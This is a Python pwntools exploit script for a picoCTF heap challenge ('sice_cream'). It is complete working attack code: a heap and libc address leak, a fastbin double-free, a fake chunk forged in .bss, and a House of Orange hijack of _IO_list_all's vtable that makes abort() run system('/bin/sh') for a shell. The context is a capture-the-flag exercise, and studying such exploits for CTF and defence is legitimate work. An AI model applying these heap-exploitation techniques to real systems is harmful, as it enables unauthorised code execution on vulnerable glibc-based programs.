#!/usr/bin/env python3

from pwn import *

exe = ELF("./sice_cream_patched")
libc = ELF("./libc-chall.so", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("fickle-tempest.picoctf.net", 64240)

    return r


def alloc(size: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.sendafter(b"> ", data)


def free(index: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(index).encode("ascii"))


def reintroduce_yourself(username: bytes, enable_read_username: bool = False):
    r.sendlineafter(b"> ", b"3")
    r.sendafter(b"> ", username)

    if enable_read_username:
        r.recvuntil(username)

    return r.recvline().strip(b"! \n")


# This GLIBC version does not use tcache :)
def main():
    r = conn()

    # Send username
    r.sendafter(b"> ", b"A" * 0x100)

    # Needed after for the double-free
    alloc(0x28, b"A" * 0x28)
    alloc(0x28, b"B" * 0x28)

    # Leak heap (username is not NULL-terminated)
    heap = u64(reintroduce_yourself(b"A" * 0x100, enable_read_username = True).ljust(8, b"\x00")) - 0x10
    log.info(f"heap @ 0x{heap:x}")
    
    # Fastbin dup:  [0] -> [1] -> [0]
    free(0)
    free(1)
    free(0)

    # Create a fake fastbin chunk in the .bss, overwrite it to make it large enough to be put in unsortedbin,
    # then free the fake chunk so that it will be put in the unsortedbin and leak libc address from it.
    alloc(0x28, p64(exe.bss(0x20)))
    alloc(0x28, b"AAAAAAAA")
    alloc(0x28, b"BBBBBBBB")

    fake_chunk = flat(
        0x0, 0x31,
        b"B" * 0x18, 0x31,
        p64(0x0) * 26   # clear everything else just in case
    )
    reintroduce_yourself(fake_chunk)
    alloc(0x28, b"A" * 0x28)

    fake_chunk = flat(
        0x0, 0x91,
        b"A" * 0x80,
        0x90, 0x21,     # `prev_size` and `size` of next (fake) chunk
        b"B" * 0x18, 0x21,  # don't remember why but we need to place another fake chunk to make it works
        b"C" * 0x18     # note: there was no need to put data in it but it was a lil' helpful while debugging
    )
    reintroduce_yourself(fake_chunk)   # make it large for unsortedbin
    free(5)

    # Leak libc
    libc.address = u64(reintroduce_yourself(b"A" * 0x10, enable_read_username = True).ljust(8, b"\x00")) - (libc.sym.main_arena + 88)
    log.info(f"libc @ 0x{libc.address:x}")


    # =================================================================================================
    # ======================================== HOUSE OF ORANGE ========================================
    # =================================================================================================

    # Get a chunk at a known address (it could be any actually) to place system() address
    free(0)
    alloc(0x28, p64(libc.sym.system) * 5)   # to make it easier, fill the fake vtable with `system()`

    fake_chunk = flat(
        b'/bin/sh\x00', 0x61,   # `prev_size` field should be a valid string to pass to our target function
        libc.sym.main_arena + 88, libc.sym._IO_list_all - 0x10,     # our target is _IO_list_all to hijack its vtable
        0x1, 0x100,     # satisfies the check `fp->_IO_write_ptr > fp->_IO_write_base`
        p64(0) * 21,    # null everything else to make it work for this scenario (this also satifies `fd->_mode = 0` right before `fd->vtable`)
        heap            # fake vtable address (`call qword ptr [rax + 0x18]` or also seen as `call vtable[3]`)
    )
    reintroduce_yourself(fake_chunk)

    # Request a chunk and then trigger `abort()`. The program flow will jump to our fake vtable which will contain `system()`
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(0x18).encode("ascii"))

    r.interactive()


if __name__ == "__main__":
    main()
